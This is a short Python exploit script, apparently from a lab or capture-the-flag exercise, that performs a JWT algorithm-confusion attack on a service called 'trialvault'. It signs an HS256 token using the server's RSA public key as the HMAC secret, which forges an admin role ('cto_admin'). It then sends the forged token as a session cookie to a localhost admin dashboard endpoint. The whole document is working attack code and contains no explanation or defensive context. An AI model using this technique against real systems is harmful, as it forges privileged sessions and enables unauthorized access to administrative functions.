import base64, hmac, hashlib, json, urllib.request, pathlib
pub = (pathlib.Path(__file__).parent / 'public.pem').read_bytes()
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=')

header  = b64u(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64u(json.dumps({
    "sub": "abcd12",        # keep your own username here
    "iss": "trialvault",
    "role": "cto_admin"     # note: singular "role", not "roles"
}).encode())
msg = header + b"." + payload
sig = b64u(hmac.new(pub, msg, hashlib.sha256).digest())
tok = (msg + b"." + sig).decode()
print(tok)



req = urllib.request.Request(
    "http://localhost:3003/api/admin/dashboard",
    headers={"Cookie": f"tv_session={tok}"}
)
print(json.loads(urllib.request.urlopen(req).read()))